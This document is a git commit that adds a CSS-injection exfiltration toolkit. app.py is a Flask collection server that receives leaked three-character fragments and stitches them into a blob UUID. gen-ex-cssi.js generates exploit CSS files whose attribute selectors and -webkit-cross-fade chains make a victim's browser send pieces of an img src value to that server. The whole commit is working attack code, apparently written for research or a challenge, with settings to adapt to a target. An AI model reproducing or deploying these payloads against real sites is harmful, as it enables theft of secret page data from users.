0e42f0902157e704e3eab66c698a392e492fe68f
Pocas <pocas.cyber@gmail.com>
2024-01-06 12:41:09 +0900

    Add files via upload

---
+++ app.py
@@ -0,0 +1,70 @@
+from flask import Flask, request
+ 
+app = Flask(__name__)
+BLOB_UUID_LENGTH = 36 # uuid 길이는 36으로 가정함
+data = []
+
+def leak_data():
+    leak = [] 
+    with open("leak.txt", "r") as file:
+        for i in file:
+            leak.append(i.strip())
+    return leak
+
+def gen_sample(start, checked, leak_data):
+    storage = [start, checked]
+    for data in leak_data:
+        if start[len(start)-2:len(start)] == data[0:2]:
+            storage[0] = start + data[2]
+            storage[1] = True
+            break
+        else:
+            storage[1] = False
+    if storage[1] == True:
+        for i in range(len(leak_data)):
+            if data == leak_data[i]:
+                del leak_data[i]
+                break
+    storage.append(leak_data)
+    return storage
+
+def update_leak_data(start, leak_data):
+    for i in range(len(leak_data)):
+        if start == leak_data[i]:
+            del leak_data[i]
+            break
+    return leak_data
+
+def main_gen(start):
+    sample, checked, leak = start, True, update_leak_data(start, leak_data())
+
+    while (checked == True):
+        result = gen_sample(sample, checked, leak)
+        sample, checked, leak = result[0], result[1], result[2]
+    return sample
+
+@app.route('/')
+def index():
+    return data
+
+@app.route('/leak')
+def leak():
+    leak_data = request.args.get('q')
+    data.append(leak_data)
+    with open('leak.txt', 'w+') as file:
+        file.write('\n'.join(data)) 
+    return 'Nice working'
+
+@app.route('/get-uuid')
+def get():
+    for data in leak_data():
+        uuid = main_gen(data)
+        if len(uuid) == BLOB_UUID_LENGTH:
+            print(f'cool, blob uuid. -> {main_gen(data)}')
+        else:
+            pass # returns nothing
+            #print(f'hmm nothing -> {uuid}')
+    return 'Nice working'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=3333)
---
+++ gen-ex-cssi.js
@@ -0,0 +1,42 @@
+const fs = require('fs')
+const host = 'http://localhost:3333'
+const charset = 'abcdefghijklmnopqrstuvwxyz0123456789-'
+const target_tag = 'img' // you have to change into  your stuff
+const target_attr = 'src' // you have to change into  your stuff
+
+let gadgets = [] // 사용할 문자 가젯 생성
+for (let a of charset) {
+    for (let b of charset) {
+        for (let c of charset) {
+            let str = a + b + c
+            gadgets.push(str)
+        }
+    }
+}
+
+const third = Math.floor(gadgets.length / 3)
+const [gadgets1, gadgets2, gadgets3] = [gadgets.slice(0, third), gadgets.slice(third, 2 * third), gadgets.slice(2 * third)]
+
+function generatePayload(gadgets) {
+    let payload = ''
+    let crossPayload = 'url("/")'
+
+    for (let str of gadgets) {
+        payload += `${target_tag}[${target_attr}*="${str}"] {--${str}: url("${host}/leak?q=${str}")}\n`
+        crossPayload = `-webkit-cross-fade(${crossPayload}, var(--${str}, none), 50%)`
+    }
+
+    return { payload, crossPayload }
+}
+
+const { payload: payload1, crossPayload: crossPayload1 } = generatePayload(gadgets1)
+const { payload: payload2, crossPayload: crossPayload2 } = generatePayload(gadgets2)
+const { payload: payload3, crossPayload: crossPayload3 } = generatePayload(gadgets3)
+
+const finalPayload1 = `${payload1} img { display: block } img { background-image: ${crossPayload1}}`
+const finalPayload2 = `${payload2}img:after { content: 'a' display: block background-image: ${crossPayload2} }`
+const finalPayload3 = `${payload3}img:before { content: 'a' display: block background-image: ${crossPayload3} }`
+
+fs.writeFileSync('exploit1.css', finalPayload1, 'utf-8')
+fs.writeFileSync('exploit2.css', finalPayload2, 'utf-8')
+fs.writeFileSync('exploit3.css', finalPayload3, 'utf-8')
